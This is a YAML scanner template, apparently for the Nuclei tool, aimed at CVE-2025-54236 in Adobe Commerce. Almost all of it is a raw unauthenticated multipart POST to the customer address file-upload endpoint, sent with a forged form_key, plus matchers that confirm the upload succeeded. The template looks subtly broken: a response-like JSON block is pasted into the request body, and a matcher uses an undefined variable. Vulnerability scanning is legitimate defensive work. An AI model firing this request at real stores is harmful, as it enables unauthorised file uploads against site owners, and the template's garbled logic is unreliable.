id: AdobeCommerc-CVE-2025-54236-AuthenticationBypass

info:
  name: AdobeCommerc-CVE-2025-54236-AuthenticationBypass
  author: iSee857
  severity: critical
  description: |
    AdobeCommerc-CVE-2025-54236-AuthenticationBypass

variables:
  session_key: "{{rand_text_alphanumeric(16)}}"
  filename: "{{to_lower(rand_text_alpha(5))}}"
  marker: "{{randstr}}"
  base64_Value: "{{base64(filename)}}"

http:
  - raw:
      - |
        POST /customer/address_file/upload HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryDNFoGI9h3cNjiBCQ
        Cookie: form_key={{session_key}}

        ------WebKitFormBoundaryDNFoGI9h3cNjiBCQ
        Content-Disposition: form-data; name="form_key"

        {{session_key}}
        ------WebKitFormBoundaryDNFoGI9h3cNjiBCQ
        Content-Disposition: form-data; name="custom_attributes[country_id]"; filename="{{filename}}"
        Content-Type: text/plain

        {{marker}}
        ------WebKitFormBoundaryDNFoGI9h3cNjiBCQ--

        {
          "name": "{{filename}}",
          "full_path": "{{filename}}",
          "type": "text/plain",
          "tmp_name": "{{filename}}",
          "error": 0,
          "size": 11,
          "file": "/t/e/{{filename}}",
          "url": "{{RootURL}}/customer/address/viewfile/file/{{base64_Value}}~~/"
        }

    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200'
          - 'contains_any(body, "full_path","tmp_name","size","{{base64}}" )'
        condition: and